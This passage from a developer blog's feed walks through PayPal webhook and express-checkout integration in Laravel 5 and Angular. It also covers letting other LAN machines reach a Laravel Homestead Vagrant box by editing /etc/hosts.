class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">namespace</span> <span class="title class_">App</span>\<span class="title class_">Http</span>\<span class="title class_">Controllers</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Http</span>\<span class="title">Request</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Http</span>\<span class="title">File</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">App</span>\<span class="title">Http</span>\<span class="title">Controllers</span>\<span class="title">Controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">PayPal</span>\<span class="title">Rest</span>\<span class="title">ApiContext</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">PayPal</span>\<span class="title">Auth</span>\<span class="title">OAuthTokenCredential</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">PayPal</span>\<span class="title">Api</span>\<span class="title">Payment</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">PayPal</span>\<span class="title">Api</span>\<span class="title">VerifyWebhookSignature</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">PayPal</span>\<span class="title">Api</span>\<span class="title">WebhookEvent</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">App</span>\<span class="title">Models</span>\<span class="title">User</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PayPalController</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$_api_context</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;_api_context = <span class="keyword">new</span> <span class="title class_">ApiContext</span>(</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">OAuthTokenCredential</span>(<span class="title function_ invoke__">config</span>(<span class="string">&#x27;paypal.client_id&#x27;</span>), <span class="title function_ invoke__">config</span>(<span class="string">&#x27;paypal.secret&#x27;</span>))</span><br><span class="line">        );</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;_api_context-&gt;<span class="title function_ invoke__">setConfig</span>(<span class="title function_ invoke__">config</span>(<span class="string">&#x27;paypal&#x27;</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Webhook (Payment sale completed)</span></span><br><span class="line"><span class="comment">     * </span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> Request $request </span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> void</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">webhooksPaymentSaleCompleted</span>(<span class="params">Request <span class="variable">$request</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">/** <span class="doctag">@var</span> string $request_body */</span></span><br><span class="line">        <span class="variable">$request_body</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/** <span class="doctag">@var</span> array $headers */</span></span><br><span class="line">        <span class="variable">$headers</span> = <span class="variable">$request</span>-&gt;headers-&gt;<span class="title function_ invoke__">all</span>();</span><br><span class="line">        <span class="variable">$headers</span> = <span class="title function_ invoke__">array_change_key_case</span>(<span class="variable">$headers</span>, CASE_UPPER);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$signature_verification</span> = <span class="keyword">new</span> <span class="title class_">VerifyWebhookSignature</span>();</span><br><span class="line">        <span class="variable">$signature_verification</span>-&gt;<span class="title function_ invoke__">setAuthAlgo</span>(<span class="variable">$headers</span>[<span class="string">&#x27;PAYPAL-AUTH-ALGO&#x27;</span>][<span class="number">0</span>]);</span><br><span class="line">        <span class="variable">$signature_verification</span>-&gt;<span class="title function_ invoke__">setTransmissionId</span>(<span class="variable">$headers</span>[<span class="string">&#x27;PAYPAL-TRANSMISSION-ID&#x27;</span>][<span class="number">0</span>]);</span><br><span class="line">        <span class="variable">$signature_verification</span>-&gt;<span class="title function_ invoke__">setCertUrl</span>(<span class="variable">$headers</span>[<span class="string">&#x27;PAYPAL-CERT-URL&#x27;</span>][<span class="number">0</span>]);</span><br><span class="line">        <span class="comment">// get the webhook ID in config file</span></span><br><span class="line">        <span class="variable">$signature_verification</span>-&gt;<span class="title function_ invoke__">setWebhookId</span>(<span class="title function_ invoke__">config</span>(<span class="string">&#x27;paypal.webhooks.payment_sale_completed&#x27;</span>)); <span class="comment">// Note that the Webhook ID must be a currently valid Webhook that you created with your client ID/secret.</span></span><br><span class="line">        <span class="variable">$signature_verification</span>-&gt;<span class="title function_ invoke__">setTransmissionSig</span>(<span class="variable">$headers</span>[<span class="string">&#x27;PAYPAL-TRANSMISSION-SIG&#x27;</span>][<span class="number">0</span>]);</span><br><span class="line">        <span class="variable">$signature_verification</span>-&gt;<span class="title function_ invoke__">setTransmissionTime</span>(<span class="variable">$headers</span>[<span class="string">&#x27;PAYPAL-TRANSMISSION-TIME&#x27;</span>][<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$signature_verification</span>-&gt;<span class="title function_ invoke__">setRequestBody</span>(<span class="variable">$request_body</span>);</span><br><span class="line">        <span class="variable">$req</span> = <span class="keyword">clone</span> <span class="variable">$signature_verification</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// for error message, I log it into a file for debug purpose</span></span><br><span class="line">        <span class="variable">$exception_log_file</span> = <span class="title function_ invoke__">storage_path</span>(<span class="string">&#x27;logs/paypal-exception.log&#x27;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">/** <span class="doctag">@var</span> \PayPal\Api\VerifyWebhookSignatureResponse $output */</span></span><br><span class="line">            <span class="variable">$output</span> = <span class="variable">$signature_verification</span>-&gt;<span class="title function_ invoke__">post</span>(<span class="variable">$this</span>-&gt;_api_context);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (\<span class="built_in">Exception</span> <span class="variable">$ex</span>) &#123;</span><br><span class="line">            <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$exception_log_file</span>, <span class="variable">$ex</span>-&gt;<span class="title function_ invoke__">getMessage</span>());</span><br><span class="line">            <span class="keyword">exit</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$status</span> = <span class="variable">$output</span>-&gt;<span class="title function_ invoke__">getVerificationStatus</span>(); <span class="comment">// &#x27;SUCCESS&#x27; or &#x27;FAILURE&#x27;</span></span><br><span class="line">        <span class="comment">// if the status is not success, then end here</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">strtoupper</span>(<span class="variable">$status</span>) !== <span class="string">&#x27;SUCCESS&#x27;</span>) <span class="keyword">exit</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$json</span> = <span class="title function_ invoke__">json_decode</span>(<span class="variable">$request_body</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Because PayPal don&#x27;t let us to add in custom data in JSON form, so I add it to a field &#x27;custom&#x27; as encoded string. Now decode to get the data back</span></span><br><span class="line">        <span class="variable">$custom_data</span> = <span class="title function_ invoke__">json_decode</span>(<span class="variable">$json</span>[<span class="string">&#x27;resource&#x27;</span>][<span class="string">&#x27;custom&#x27;</span>], <span class="number">1</span>);</span><br><span class="line">        <span class="variable">$user</span> = <span class="title class_">User</span>::<span class="title function_ invoke__">find</span>(<span class="variable">$custom_data</span>[<span class="string">&#x27;user_id&#x27;</span>]); <span class="comment">// to get the User</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// save the payment info</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// generate invoice</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// email to user</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$status</span>; <span class="comment">// at the end must echo the status</span></span><br><span class="line">        <span class="keyword">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/images/posts/2018-01-22-PayPal-Rest-API-with-Laravel-5-and-Angular/paypal-webhook-list.png" alt="PayPal webhooks list"></p><p>You can see there are green tick and yellow exclamation mark. The <code>echo $status;</code> is to tell the PayPal server that this webhook has been processed. Otherwise it will resend the POST webhook request.</p><h2 id="In-Angular"><a href="#In-Angular" class="headerlink" title="In Angular"></a>In Angular</h2><p>Here is pretty simple, just need to add in the JavaScript code to the component.</p><h3 id="1-Add-PayPal-to-environment-settings"><a href="#1-Add-PayPal-to-environment-settings" class="headerlink" title="1. Add PayPal to environment settings"></a>1. Add PayPal to environment settings</h3><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="attr">services</span>: &#123;</span><br><span class="line">  <span class="attr">paypal</span>: &#123;</span><br><span class="line">    <span class="attr">clientId</span>: <span class="string">&#x27;AcT3DS8a-SmTEtSl9hNcwyscoLypndD9q5L0YcfxmaUavz3p_xwFNRE-OauO&#x27;</span>,</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure><h3 id="2-Add-the-PayPal-express-checkout-button-to-a-component"><a href="#2-Add-the-PayPal-express-checkout-button-to-a-component" class="headerlink" title="2. Add the PayPal express checkout button to a component"></a>2. Add the PayPal express checkout button to a component</h3><p><strong>pricing.component.html</strong> for example</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;paypal-button-container&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p>Update the <strong>pricing.component.ts</strong></p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">declare</span> <span class="keyword">var</span> <span class="attr">$</span>:<span class="built_in">any</span>; <span class="comment">// want to use jQuery here</span></span><br><span class="line"><span class="keyword">declare</span> <span class="keyword">var</span> <span class="attr">paypal</span>:<span class="built_in">any</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Component</span>(&#123;</span><br><span class="line">  <span class="attr">selector</span>: <span class="string">&#x27;app-pricing&#x27;</span>,</span><br><span class="line">  <span class="attr">templateUrl</span>: <span class="string">&#x27;./pricing.component.html&#x27;</span>,</span><br><span class="line">  <span class="attr">styleUrls</span>: [<span class="string">&#x27;./pricing.component.scss&#x27;</span>]</span><br><span class="line">&#125;)</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">class</span> <span class="title class_">PricingComponent</span> <span class="keyword">implements</span> <span class="title class_">OnInit</span>, <span class="title class_">AfterViewChecked</span> &#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">private</span> <span class="attr">didRenderPaypal</span>: <span class="built_in">boolean</span> = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">  <span class="title function_">ngAfterViewChecked</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">configurePaypal</span>();</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="title function_">configurePaypal</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable language_">this</span>.<span class="property">didRenderPaypal</span>) &#123;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">var</span> userId = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">      <span class="variable language_">this</span>.<span class="title function_">loadPaypalScript</span>().<span class="title function_">then</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">        paypal.<span class="property">Button</span>.<span class="title function_">render</span>(&#123;</span><br><span class="line">            <span class="attr">env</span>: <span class="string">&#x27;sandbox&#x27;</span>, <span class="comment">// sandbox | production</span></span><br><span class="line">            <span class="comment">// Create a PayPal app: https://developer.paypal.com/developer/applications/create</span></span><br><span class="line">            <span class="attr">client</span>: &#123;</span><br><span class="line">              <span class="attr">sandbox</span>:    environment.<span class="property">services</span>.<span class="property">paypal</span>.<span class="property">clientId</span>,</span><br><span class="line">              <span class="attr">production</span>: environment.<span class="property">services</span>.<span class="property">paypal</span>.<span class="property">clientId</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="comment">// Show the buyer a &#x27;Pay Now&#x27; button in the checkout flow</span></span><br><span class="line">            <span class="attr">commit</span>: <span class="literal">true</span>,</span><br><span class="line"></span><br><span class="line">            <span class="comment">// payment() is called when the button is clicked</span></span><br><span class="line">            <span class="attr">payment</span>: <span class="keyword">function</span>(<span class="params">data, actions</span>) &#123;</span><br><span class="line"></span><br><span class="line">              <span class="comment">// Make a call to the REST api to create the payment</span></span><br><span class="line">              <span class="keyword">return</span> actions.<span class="property">payment</span>.<span class="title function_">create</span>(&#123;</span><br><span class="line">                <span class="attr">payment</span>: &#123;</span><br><span class="line">                  <span class="attr">transactions</span>: [</span><br><span class="line">                    &#123;</span><br><span class="line">                      <span class="attr">amount</span>: &#123;</span><br><span class="line">                        <span class="attr">total</span>: $(<span class="string">&#x27;#total&#x27;</span>).<span class="title function_">val</span>(),</span><br><span class="line">                        <span class="attr">currency</span>: <span class="string">&#x27;MYR&#x27;</span>,</span><br><span class="line">                        <span class="attr">details</span>: &#123;</span><br><span class="line">                          <span class="attr">subtotal</span>: $(<span class="string">&#x27;#subtotal&#x27;</span>).<span class="title function_">val</span>(),</span><br><span class="line">                          <span class="attr">tax</span>: $(<span class="string">&#x27;#tax&#x27;</span>).<span class="title function_">val</span>(),</span><br><span class="line">                        &#125;</span><br><span class="line">                      &#125;,</span><br><span class="line">                      <span class="attr">custom</span>: <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(&#123; <span class="comment">// YOU CAN ADD CUSTOM DATA HERE</span></span><br><span class="line">                        <span class="attr">user_id</span>: userId,</span><br><span class="line">                        <span class="attr">qty</span>: $(<span class="string">&#x27;#qty&#x27;</span>).<span class="title function_">val</span>()</span><br><span class="line">                      &#125;)</span><br><span class="line">                    &#125;</span><br><span class="line">                  ]</span><br><span class="line">                &#125;</span><br><span class="line">              &#125;);</span><br><span class="line">            &#125;,</span><br><span class="line"></span><br><span class="line">            <span class="comment">// onAuthorize() is called when the buyer approves the payment</span></span><br><span class="line">            <span class="attr">onAuthorize</span>: <span class="keyword">function</span>(<span class="params">data, actions</span>) &#123;</span><br><span class="line">              <span class="comment">// Make a call to the REST api to execute the payment</span></span><br><span class="line">              <span class="keyword">return</span> actions.<span class="property">payment</span>.<span class="title function_">execute</span>().<span class="title function_">then</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(data);</span><br><span class="line">                <span class="variable language_">window</span>.<span class="title function_">alert</span>(<span class="string">&#x27;Payment Complete!&#x27;</span>);</span><br><span class="line">              &#125;);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;, <span class="string">&#x27;#paypal-button-container&#x27;</span>);</span><br><span class="line">      &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">private</span> <span class="title function_">loadPaypalScript</span>(): <span class="title class_">Promise</span>&lt;<span class="built_in">any</span>&gt; &#123;</span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">didRenderPaypal</span> = <span class="literal">true</span>;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">          <span class="keyword">const</span> scriptElement = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;script&#x27;</span>);</span><br><span class="line">          scriptElement.<span class="property">src</span> = <span class="string">&#x27;https://www.paypalobjects.com/api/checkout.js&#x27;</span>;</span><br><span class="line">          scriptElement.<span class="property">onload</span> = resolve;</span><br><span class="line">          <span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(scriptElement);</span><br><span class="line">      &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>The PayPal JavaScript file must be injected during run time.</p><p>You can see I use a lot of jQuery <em>(e.g. <code>$(&#39;total&#39;).val()</code>)</em>, is because the code block inside is cannot be set a typescript variable directly, the total amount may change if user change products. Thus, jQuery can ensure it get the correct value from the form.</p><p>Now you run your Angular app, you should see a PayPal button there.</p><p><img src="/images/posts/2018-01-22-PayPal-Rest-API-with-Laravel-5-and-Angular/paypal-payment-popup.png" alt="PayPal payment popup"></p><p>Once you make the payment, the webhook will be triggered.</p><h2 id="Update-2018-01-25"><a href="#Update-2018-01-25" class="headerlink" title="Update: 2018-01-25"></a>Update: 2018-01-25</h2><p>Let say you don’t want the payment processing part by webhooks, you can do it in the JavaScript success block.</p><h3 id="Angular-part"><a href="#Angular-part" class="headerlink" title="Angular part"></a>Angular part</h3><p>Edit <strong>pricing.component.ts</strong></p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="attr">onAuthorize</span>: <span class="keyword">function</span>(<span class="params">data, actions</span>) &#123;</span><br><span class="line">  <span class="comment">// Make a call to the REST api to execute the payment</span></span><br><span class="line">  <span class="keyword">return</span> actions.<span class="property">payment</span>.<span class="title function_">execute</span>().<span class="title function_">then</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    that.<span class="property">http</span></span><br><span class="line">      .<span class="title function_">post</span>(</span><br><span class="line">        <span class="string">&#x27;https://www.yoursite.com/api/paypal/checkout&#x27;</span>,</span><br><span class="line">        data</span><br><span class="line">      )</span><br><span class="line">      .<span class="title function_">toPromise</span>()</span><br><span class="line">      .<span class="title function_">then</span>(<span class="function"><span class="params">res</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="comment">// success submit</span></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(res.<span class="title function_">json</span>());</span><br><span class="line">      &#125;)</span><br><span class="line">      .<span class="title function_">catch</span>(<span class="function"><span class="params">res</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="comment">// POST error</span></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(res);</span><br><span class="line">      &#125;);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure><h3 id="Laravel-part"><a href="#Laravel-part" class="headerlink" title="Laravel part"></a>Laravel part</h3><p>Add a new route</p><p>Edit the <strong>routes/api.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title class_">Route</span>::<span class="title function_ invoke__">post</span>(<span class="string">&#x27;paypal/checkout&#x27;</span>, [<span class="string">&#x27;uses&#x27;</span> =&gt; <span class="string">&#x27;PayPalController@checkout&#x27;</span>]);</span><br></pre></td></tr></table></figure><p>Then edit <strong>app/Http/Controllers/PayPalController.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">...</span><br><span class="line"><span class="keyword">use</span> <span class="title">PayPal</span>\<span class="title">Exception</span>\<span class="title">PayPalConnectionException</span>;</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkout</span>(<span class="params">Request <span class="variable">$request</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="comment">// validate input</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// get payment detail and verify</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="variable">$payment</span> = <span class="title class_">Payment</span>::<span class="title function_ invoke__">get</span>(<span class="variable">$request</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;paymentID&#x27;</span>), <span class="variable">$this</span>-&gt;_api_context);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (PayPalConnectionException <span class="variable">$e</span>) &#123;</span><br><span class="line">        <span class="variable">$error_json</span> = <span class="title function_ invoke__">json_decode</span>(<span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getData</span>(), <span class="number">1</span>);</span><br><span class="line">        <span class="title function_ invoke__">print_r</span>(<span class="variable">$error_json</span>);</span><br><span class="line">        <span class="keyword">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// generate and email pdf</span></span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>References:</p><ul><li><a href="https://github.com/paypal/paypal-checkout/issues/368#issuecomment-326829806">angular 4 and paypal express checkout</a></li></ul>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;Previously I wrote a post regarding to &lt;a href=&quot;/blog/2014/09/19/integrate-paypal-sdk-into-laravel-4/&quot;&gt;Integrate PayPal SDK into Laravel</summary>
        
      
    
    
    
    
    <category term="php" scheme="http://jslim.net/tags/php/"/>
    
    <category term="laravel" scheme="http://jslim.net/tags/laravel/"/>
    
    <category term="paypal" scheme="http://jslim.net/tags/paypal/"/>
    
    <category term="angular" scheme="http://jslim.net/tags/angular/"/>
    
  </entry>
  
  <entry>
    <title>Allow Vagrant to access from other computers in LAN network</title>
    <link href="http://jslim.net/blog/2017/11/22/Allow-Vagrant-to-access-from-other-computers-in-LAN-network/"/>
    <id>http://jslim.net/blog/2017/11/22/Allow-Vagrant-to-access-from-other-computers-in-LAN-network/</id>
    <published>2017-11-22T03:29:55.000Z</published>
    <updated>2022-05-09T09:30:48.617Z</updated>
    
    <content type="html"><![CDATA[<p>I’m using <a href="https://laravel.com/docs/5.5/homestead">Laravel Homestead</a>. By default, the config is set to <em>private network</em> with IP <code>192.168.10.10</code>.</p><p>Now, let’s allow it to access from other clients.</p><h3 id="In-the-PC-with-Homestead-installed-e-g-192-168-1-115"><a href="#In-the-PC-with-Homestead-installed-e-g-192-168-1-115" class="headerlink" title="In the PC with Homestead installed (e.g. 192.168.1.115)"></a>In the PC with Homestead installed <em>(e.g. 192.168.1.115)</em></h3><p>Edit the file <strong>/etc/hosts</strong></p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">192.168.10.10</span>  my.dev.domain</span><br><span class="line"><span class="number">127.0.0.1</span>      my.dev.domain</span><br></pre></td></tr></table></figure><h3 id="In-the-PC-that-want-to-access-the-Homestead-web-app"><a href="#In-the-PC-that-want-to-access-the-Homestead-web-app" class="headerlink" title="In the PC that want to access the Homestead web app"></a>In the PC that want to access the Homestead web app</h3><p>Edit the file <strong>/etc/hosts</strong></p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">192.168.1.115</span>  my.dev.domain</span><br></pre></td></tr></table></figure><p>Done. Now you can open up the browser, and key in the URL <code>http://my.dev.domain:8000</code>. <em>(The port number by default is 8000)</em></p><p>References:</p><ul><li><a href="https://laracasts.com/discuss/channels/general-discussion/accessing-homesteadvagrant-site-from-different-device-on-same-network">Accessing Homestead/Vagrant site from different device on same network</a></li></ul>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;I’m using &lt;a href=&quot;https://laravel.com/docs/5.5/homestead&quot;&gt;Laravel Homestead&lt;/a&gt;. By default, the config is set to &lt;em&gt;private</summary>
        
      
    
    
    
    
    <category term="vagrant" scheme="http://jslim.net/tags/vagrant/"/>
    
    <category term="devops" scheme="http://jslim.net/tags/devops/"/>
    
    <category term="homestead" scheme="http://jslim.net/tags/homestead/"/>
    
  </entry>
  
  <entry>
    <title>How to backup MySQL database from time to time</title>
    <link href="http://jslim.net/blog/2017/04/19/How-to-backup-MySQL-database-from-time-to-time/"/>
    <id>http://jslim.net/blog/2017/04/19/How-to-backup-MySQL-database-from-time-to-time/</id>
    <published>2017-04-19T08:16:35.000Z</published>
    <updated>2022-05-09T09:30:48.617Z</updated>
    
